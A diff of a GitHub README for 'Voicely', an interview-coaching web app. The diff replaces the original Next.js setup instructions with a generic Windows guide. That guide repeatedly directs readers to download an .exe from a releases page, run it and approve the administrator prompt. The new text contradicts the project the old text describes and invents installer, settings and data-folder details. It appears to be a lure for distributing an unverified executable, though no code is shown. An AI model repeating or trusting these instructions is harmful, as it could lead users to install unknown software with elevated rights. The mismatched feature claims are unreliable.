@@ -1,74 +1,173 @@
-Voicely is a real-time structured thinking coach for mock interviews and high-pressure communication.
-It listens to your question, classifies the type, and coaches your answer with frameworks, filler tracking, and feedback.
+# 🎙️ voicely - Real-Time Voice AI for Interviews
 
-## What it does
+[![Download voicely](https://img.shields.io/badge/Download-voicely-green?style=for-the-badge)](https://github.com/rizwiz104/voicely/releases)
 
-- Real-time transcription via browser speech or Smallest streaming (PCM/Opus)
-- Instant question-type detection with structured frameworks
-- Practice mode flow: question → answer → quality feedback
-- Filler word counter, input level meter, and latency tracking
-- Demo prompts for rapid pitch mode
+---
 
-## Getting Started
+voicely is a voice AI tool designed to help you practice interviews. It listens to your speech live, identifies what kind of question you are answering, builds a clear answer structure, and checks how well you respond – all as you speak. This makes interview practice more natural and helpful.
 
-### 1) Install
+This guide will help you download, install, and start using voicely on a Windows PC. No programming experience is needed.
 
-```bash
-npm install
-```
+---
 
-### 2) Run
+## 💻 System Requirements
 
-```bash
-npm run dev
-# or
-yarn dev
-# or
-pnpm dev
-# or
-bun dev
-```
+Before installing, make sure your PC meets these needs:
 
-Open [http://localhost:3000](http://localhost:3000) to use the app.
+- Windows 10 or later (64-bit recommended)  
+- At least 4 GB of RAM  
+- A working microphone (USB or built-in)  
+- Internet connection for streaming and AI processing  
+- Around 200 MB of free space for installation  
 
-## Environment (optional)
+If your PC meets these, voicely should run smoothly.
 
-For Smallest streaming:
+---
 
-```bash
-NEXT_PUBLIC_SMALLEST_WS_URL=wss://api.smallest.ai/stt/stream
-NEXT_PUBLIC_SMALLEST_STREAM_MODE=pcm # or opus
-```
+## 🚀 Getting Started
 
-Optional mic boost for low input:
+Here’s how to get voicely running in a few simple steps.  
 
-```bash
-NEXT_PUBLIC_INPUT_GAIN=1.5
-```
+### 1. Go to the Download Page
 
-## Demo flow (quick)
+Click the green download badge above or visit the releases page here:  
+[https://github.com/rizwiz104/voicely/releases](https://github.com/rizwiz104/voicely/releases)  
 
-1. Click a demo prompt or ask a question.
-2. The question locks and the framework appears.
-3. Answer out loud and watch feedback update in real time.
+This page contains the latest versions of voicely ready for Windows.
 
-You can start editing the page by modifying `app/page.tsx`. The page auto-updates as you edit the file.
+---
 
-This project uses [`next/font`](https://nextjs.org/docs/app/building-your-application/optimizing/fonts) to automatically optimize and load [Geist](https://vercel.com/font), a new font family for Vercel.
+### 2. Find the Latest Windows File
 
-## Tech stack
+On the releases page, look for files with `.exe` in their name. These are the installation files for Windows. It might look like:  
 
-- Next.js (App Router)
-- Smallest.ai Streaming STT (optional)
-- Lightweight API routes for analysis + evaluation
+- `voicely-setup.exe`  
+- `voicely-latest-win.exe`
 
-To learn more about Next.js, take a look at the following resources:
+Pick the most recent file with `.exe`.
 
-- [Next.js Documentation](https://nextjs.org/docs) - learn about Next.js features and API.
-- [Learn Next.js](https://nextjs.org/learn) - an interactive Next.js tutorial.
+---
 
-You can check out [the Next.js GitHub repository](https://github.com/vercel/next.js) - your feedback and contributions are welcome!
+### 3. Download the Installer
 
-## Deploy
+Click on the `.exe` file name to download it. Your browser will save this file to your “Downloads” folder or wherever you keep downloaded files.
 
-Deploy on Vercel or any Node host. The app is client-heavy and runs well on free tiers.
+---
+
+### 4. Run the Installer
+
+- Open the folder where the file is saved.  
+- Double-click the `.exe` file.  
+- If Windows asks “Do you want to allow this app to make changes?”, click **Yes**.
+
+This will start the installation process.
+
+---
+
+### 5. Follow Installation Steps
+
+The installer window will guide you through:
+
+- Choosing where to save voicely on your computer.  
+- Agreeing to any terms or conditions.  
+- Selecting shortcuts if offered (like a desktop icon).  
+
+To keep it simple, use the default options and click **Next** or **Install** when prompted.
+
+---
+
+### 6. Finish Installation
+
+Once setup completes, you will see a confirmation window. Click **Finish**.
+
+You should now find the voicely app on your desktop or in your Start Menu under “voicely.”
+
+---
+
+## 🎤 Using voicely
+
+### 1. Launch voicely
+
+Open the app by double-clicking the icon or finding it in your Start Menu.
+
+---
+
+### 2. Set Up Your Microphone
+
+On first launch, voicely will ask to use your microphone. Make sure your mic is plugged in and working.  
+
+- Select your microphone from the list if there are multiple devices.  
+- Adjust the input level if the app shows a microphone volume slider.
+
+---
+
+### 3. Start Your Practice Session
+
+Click the **Start** button or similar to begin recording your voice.
+
+---
+
+### 4. Speak Clearly
+
+Try to answer questions naturally. voicely will:
+
+- Display your spoken words as text in real time.  
+- Identify if you are answering a question or pausing.  
+- Build an outline of your answer’s main points.  
+- Show feedback on your answer’s quality.
+
+---
+
+### 5. Review Feedback
+
+After you finish answering, voicely will provide:
+
+- A breakdown of how you structured your answer.  
+- Suggestions to improve clarity or completeness.  
+- A score for your answer quality.
+
+Use this feedback to guide your next practice round.
+
+---
+
+## ⚙️ Settings and Preferences
+
+Explore the **Settings** menu to adjust:
+
+- Microphone volume  
+- Display language  
+- Audio output device  
+- Feedback detail level
+
+Adjust these to your comfort to get the best experience.
+
+---
+
+## 📁 File Management
+
+voicely saves your practice sessions locally. Find recordings and session data in the “voicely_data” folder inside your Documents folder.
+
+You can listen to your past sessions or delete them as needed.
+
+---
+
+## ❓ Troubleshooting
+
+- If voicely doesn’t detect your microphone, check if it’s plugged in and not muted.  
+- Restart the app if you experience glitches.  
+- Close other apps that might be using the microphone.  
+- Make sure your internet connection is stable for streaming processing.
+
+---
+
+## 🌐 More Help
+
+For updates, bug reports, and detailed guides, visit the release page again:  
+[https://github.com/rizwiz104/voicely/releases](https://github.com/rizwiz104/voicely/releases)
+
+You can find help materials and community discussions there.
+
+---
+
+**Topics covered by voicely:**  
+Interview training, latency awareness, mock interview environment, real-time AI feedback, speech-to-text conversion, streaming audio, voice agents for PC, and lightweight AI systems.
